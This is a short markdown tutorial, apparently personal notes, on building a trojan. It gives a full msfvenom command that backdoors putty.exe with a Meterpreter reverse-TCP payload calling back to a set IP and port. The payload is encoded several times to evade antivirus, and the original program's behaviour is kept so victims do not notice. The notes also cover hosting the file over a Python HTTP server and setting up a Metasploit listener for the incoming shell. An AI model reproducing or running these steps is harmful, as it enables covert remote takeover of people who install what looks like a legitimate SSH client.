# Trojan

### A Trojan can be like a hacking Swiss army knife acting as standalone malware or as a tool for other activities such as: future delivery of payloads, to communicate later with the hacker, or to leave the system open and open to attacks, from the just like the Greek soldiers built inside the fortress of Troy.

### PuTTY - Remote SSH connector for Windows
### Creating the Trojan:

1. Download ``putty.exe``
2. ``msfvenom -a x86 -x putty.exe --platform windows -k -p windows/meterpreter/reverse_tcp lhost=192.168.0.94 lport=443 -e x86/shikata_ga_nai -i 5 -f exe -o evilOutput.exe`` <br>
``-a`` => Architecture <br>
``-x`` => Backdoor archive <br>
``-k`` => Keeping original application behavior <br>
``-p`` => Payload for the Windows interpreter (CMD) <br>
``lhost`` => My Kali's IP to be connected to the target Windows (if the attack is external, use your external IP and so on) <br>
``-e`` => Encoder to bypass the antivirus <br>
``-i`` => Times this will be encoded <br>
``-o`` => Name that the archive will be saved as <br>

If you need to download it: ``python3 -m http.server`` and you will set up an HTTP server in the current path to download it <br>
``-m`` => Module

### Creating the listener:

1. ``msfconsole``
2. ``search multi/handler`` => 5  exploit/multi/handler
3. ``use 5``
4. ``set PAYLOAD windows/meterpreter/reverse_tcp``
5. ``set LHOST 192.168.0.94``
6. ``set LPORT 443``
7. ``run``
